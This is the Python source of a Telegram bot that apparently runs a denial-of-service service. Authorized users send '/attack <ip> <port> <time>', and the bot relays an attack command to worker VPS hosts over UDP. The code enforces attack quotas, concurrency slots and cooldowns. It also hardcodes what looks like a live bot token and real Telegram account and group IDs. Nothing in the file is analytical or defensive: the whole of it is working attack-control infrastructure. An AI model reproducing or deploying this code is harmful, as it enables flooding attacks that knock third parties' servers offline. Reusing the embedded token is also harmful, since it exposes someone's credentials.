# Advanced Telegram Bot v2 - Fully Loaded

from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update, ChatPermissions
from keep_alive import keep_alive
import logging, socket, os, time, hashlib, threading
from datetime import datetime, timedelta
import uuid

# === CONFIG ===
TOKEN = "6838193855:AAGcpUWdeYWUjg75mSNZ5c7gS8E0nny63RM"
ADMIN_ID = 6512242172
GROUP_ID = -1002365524959
WORKER_VPS_LIST = ["151.106.112.221", "5.6.7.8"]

MAX_DAILY_ATTACKS = 10
MAX_ATTACK_DURATION = 180
MAX_CONCURRENT_ATTACKS = 3
MUTE_DURATION = 900  # 15 mins
ATTACK_COOLDOWN = 60  # seconds
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# === STATE ===
authorized_users = set()
user_attack_log = {}
last_attack_time = {}
active_attacks = []  # [{id, user, target, time}]
screenshot_received = {}
attack_slot_lock = threading.Lock()
worker_index = 0

keep_alive()
logging.basicConfig(level=logging.INFO)

# === HELPERS ===
def log_action(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def save_user(uid):
    with open(USER_FILE, "a") as f:
        f.write(f"{uid} - {datetime.now()}\n")

def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE) as f:
            for line in f:
                authorized_users.add(line.strip().split()[0])

def get_next_worker():
    global worker_index
    ip = WORKER_VPS_LIST[worker_index % len(WORKER_VPS_LIST)]
    worker_index += 1
    return ip

def is_duplicate_image(file_id):
    hash_file = "image_hashes.txt"
    hash_val = hashlib.md5(file_id.encode()).hexdigest()
    if os.path.exists(hash_file):
        with open(hash_file, "r") as f:
            if hash_val in f.read():
                return True
    with open(hash_file, "a") as f:
        f.write(hash_val + "\n")
    return False

# === COMMANDS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 Bot is Alive!\n"
        "🔗 Channel: https://t.me/kasukabe0\n"
        "👨‍💼 Owner: @offx_sahil",
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("/attack <ip> <port> <time>\n/status\n/clearstatus <id>\n/adduser <id>\n/removeuser <id>\n/mylogs\n/clearlogs\n/allusers")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    now = datetime.now()

    if user_id not in authorized_users and user_id != str(ADMIN_ID):
        return

    if not screenshot_received.get(user_id, False):
        await update.message.reply_text("⚠️ Please send feedback screenshot before next attack.")
        return

    if user_id != str(ADMIN_ID):
        last = last_attack_time.get(user_id)
        if last and (now - last).seconds < ATTACK_COOLDOWN:
            await update.message.reply_text("⚠️ Cooldown active. Try again in a few seconds.")
            return

        today_log = user_attack_log.get(user_id, [])
        today_log = [t for t in today_log if t.date() == now.date()]
        if len(today_log) >= MAX_DAILY_ATTACKS:
            await update.message.reply_text("❌ Daily attack limit reached.")
            return
        today_log.append(now)
        user_attack_log[user_id] = today_log
        last_attack_time[user_id] = now

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text("⚠️ All attack slots are full. Try again later.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = args
    try:
        port = int(port)
        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            await update.message.reply_text("⚠️ Max duration is 180 seconds.")
            return
    except:
        await update.message.reply_text("⚠️ Invalid values.")
        return

    attack_id = str(uuid.uuid4())[:8]
    vps_ip = get_next_worker()
    cmd = f"./iiipx {ip} {port} {duration}"

    with attack_slot_lock:
        active_attacks.append({"id": attack_id, "user": user_id, "target": f"{ip}:{port}", "time": f"{duration}s"})

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(cmd.encode(), (vps_ip, 9999))
        await update.message.reply_text(f"✅ Attack started via {vps_ip}\n🆔 ID: `{attack_id}`", parse_mode="Markdown")
        log_action(f"{user_id} -> {cmd} -> {vps_ip} [{attack_id}]")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending command: {e}")
    screenshot_received[user_id] = False

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    file_id = update.message.photo[-1].file_unique_id
    if is_duplicate_image(file_id):
        await update.message.reply_text("⚠️ Duplicate screenshot. You are muted for 15 mins.")
        try:
            await context.bot.restrict_chat_member(update.effective_chat.id, int(user_id), ChatPermissions(can_send_messages=False), until_date=int(time.time()) + MUTE_DURATION)
        except: pass
        return
    screenshot_received[user_id] = True
    await update.message.reply_text("✅ Screenshot accepted. You can now use /attack.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not active_attacks:
        await update.message.reply_text("✅ No active attacks.")
    else:
        msg = "\n".join([f"🆔 {atk['id']} | {atk['target']} | {atk['time']}" for atk in active_attacks])
        await update.message.reply_text("📊 *Active Attacks:*\n" + msg, parse_mode="Markdown")

async def clearstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /clearstatus <id>")
        return
    attack_id = args[0]
    with attack_slot_lock:
        for atk in active_attacks:
            if atk["id"] == attack_id:
                active_attacks.remove(atk)
                await update.message.reply_text(f"✅ Attack {attack_id} cleared.")
                return
    await update.message.reply_text("❌ ID not found.")

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /adduser <id>")
        return
    uid = args[0]
    authorized_users.add(uid)
    save_user(uid)
    await update.message.reply_text(f"✅ User {uid} added.")

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /removeuser <id>")
        return
    uid = args[0]
    authorized_users.discard(uid)
    await update.message.reply_text(f"✅ User {uid} removed.")

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    await update.message.reply_text("👥 Users:\n" + "\n".join(authorized_users))

async def clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(ADMIN_ID): return
    open(LOG_FILE, "w").close()
    await update.message.reply_text("🧹 Logs cleared.")

async def mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if not os.path.exists(LOG_FILE):
        await update.message.reply_text("No logs found.")
        return
    with open(LOG_FILE) as f:
        lines = [line.strip() for line in f if uid in line]
    await update.message.reply_text("\n".join(lines[-5:]) if lines else "No recent logs.")

# === MAIN ===
def main():
    load_users()
    authorized_users.add(str(ADMIN_ID))
    authorized_users.add(str(GROUP_ID))

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearstatus", clearstatus))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("clearlogs", clearlogs))
    app.add_handler(CommandHandler("mylogs", mylogs))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
